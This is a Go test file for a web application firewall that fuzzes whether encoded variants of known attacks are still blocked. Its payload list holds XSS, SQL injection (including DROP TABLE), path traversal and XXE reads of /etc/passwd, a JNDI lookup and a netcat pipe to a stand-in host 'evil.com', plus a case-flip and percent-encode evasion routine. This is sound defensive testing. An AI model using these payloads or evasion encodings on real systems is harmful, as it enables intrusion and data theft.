package engine

import (
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"

	"wewaf/internal/core"
)

// evasionBlocked runs payload as a query arg through BOTH phases — args-targeted
// rules fire in either the header phase (XSS-002, SQLI-024) or the body phase
// (SQLI-001, CRS-942100), so a single-phase check would miss real coverage.
func evasionBlocked(eng *Engine, payload string) bool {
	u := "/probe?x=" + url.QueryEscape(payload)
	req := httptest.NewRequest(http.MethodGet, u, nil)
	tx := core.NewTransaction(nil, req, nil)
	if eng.ProcessRequestHeaders(tx) != nil {
		return true
	}
	return eng.ProcessRequestBody(tx) != nil
}

// FuzzWAFEvasionArgs is a metamorphic bypass hunter. Instead of only asserting
// "no panic", it asserts a SECURITY property: if the engine blocks an attack in
// its canonical form, it must also block every SEMANTICS-PRESERVING re-encoding
// of that attack — because those encodings are exactly the ones the engine's
// canonicalization is designed to reverse.
//
// The two mutations applied are SOUND for the query-arg sink:
//   - case-flipping letters — every injection rule is case-insensitive ((?i)),
//     and the canonicalizer doesn't depend on case, so an attack stays an attack;
//   - percent-encoding bytes — the arg pipeline url-decodes (3-pass) before
//     matching, so %XX (and the %25XX double-encoding url.QueryEscape then adds)
//     decode back to the same canonical bytes.
//
// Therefore a mutated payload that the engine FAILS to block is a genuine
// canonicalization/decoding gap (a WAF bypass), not a false positive — the
// backend would decode it to the same attack the WAF blocks in plain form. This
// is the exact bug class behind the UNION DISTINCT / js-protocol findings.
//
// Run:  go test ./internal/engine -run x -fuzz FuzzWAFEvasionArgs -fuzztime 60s
func FuzzWAFEvasionArgs(f *testing.F) {
	eng := newFuzzEngine(f)

	// A spread of attack classes the WAF blocks in canonical form. The fuzzer
	// indexes into this and re-encodes the chosen one.
	attacks := []string{
		`<script>alert(1)</script>`,
		`<img src=x onerror=alert(1)>`,
		`javascript:alert(document.cookie)`,
		`1' UNION SELECT password FROM users-- -`,
		`1' OR '1'='1`,
		`'; DROP TABLE users-- -`,
		`../../../../etc/passwd`,
		`....//....//etc/passwd`,
		`{{7*7}}`,
		`${jndi:ldap://evil/a}`,
		`; cat /etc/passwd`,
		`| nc evil.com 4444`,
		`<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>`,
		`{"$where":"this.a==1"}`,
		`php://filter/convert.base64-encode/resource=index.php`,
	}

	for i := range attacks {
		f.Add(i, uint64(0))                  // identity (sanity)
		f.Add(i, uint64(0xAAAAAAAAAAAAAAAA)) // alternating mutations
		f.Add(i, uint64(0xFFFFFFFFFFFFFFFF)) // encode-heavy
	}

	f.Fuzz(func(t *testing.T, idx int, bits uint64) {
		if idx < 0 || idx >= len(attacks) {
			return
		}
		payload := attacks[idx]
		// Only test payloads the WAF actually blocks in canonical form — that's
		// the baseline the metamorphic property is anchored on.
		if !evasionBlocked(eng, payload) {
			return
		}
		mutated := mutateSemanticPreserving(payload, bits)
		if mutated == payload {
			return
		}
		if !evasionBlocked(eng, mutated) {
			t.Fatalf("EVASION: %q (semantics-preserving re-encoding of %q) was NOT blocked", mutated, payload)
		}
	})
}

// TestWAFEvasionCorpusIsLive guards the metamorphic fuzzer against silently
// going vacuous: the core injection classes MUST block in an arg in canonical
// form, otherwise FuzzWAFEvasionArgs skips them (and the WAF has a real gap).
func TestWAFEvasionCorpusIsLive(t *testing.T) {
	eng := newFuzzEngine(t)
	for _, p := range []string{
		`<script>alert(1)</script>`,
		`<img src=x onerror=alert(1)>`,
		`javascript:alert(document.cookie)`,
		`1' UNION SELECT password FROM users-- -`,
		`1' OR '1'='1`,
		`../../../../etc/passwd`,
		`{{7*7}}`,
		`${jndi:ldap://evil/a}`,
	} {
		if !evasionBlocked(eng, p) {
			t.Errorf("corpus payload not blocked in arg (metamorphic fuzzer is vacuous for it): %q", p)
		}
	}
}

// mutateSemanticPreserving applies a per-byte mix of identity / case-flip /
// percent-encode driven by the fuzz bits. Both transforms are reversed by the
// engine's arg canonicalization, so the result is the same attack to a backend.
func mutateSemanticPreserving(s string, bits uint64) string {
	var b strings.Builder
	b.Grow(len(s) * 3)
	const hex = "0123456789ABCDEF"
	for i := 0; i < len(s); i++ {
		c := s[i]
		switch (bits >> uint((i*2)%64)) & 3 {
		case 1: // case-flip ASCII letters (no-op for non-letters)
			if c >= 'a' && c <= 'z' {
				c -= 32
			} else if c >= 'A' && c <= 'Z' {
				c += 32
			}
			b.WriteByte(c)
		case 2, 3: // percent-encode the byte
			b.WriteByte('%')
			b.WriteByte(hex[c>>4])
			b.WriteByte(hex[c&0x0f])
		default: // identity
			b.WriteByte(c)
		}
	}
	return b.String()
}
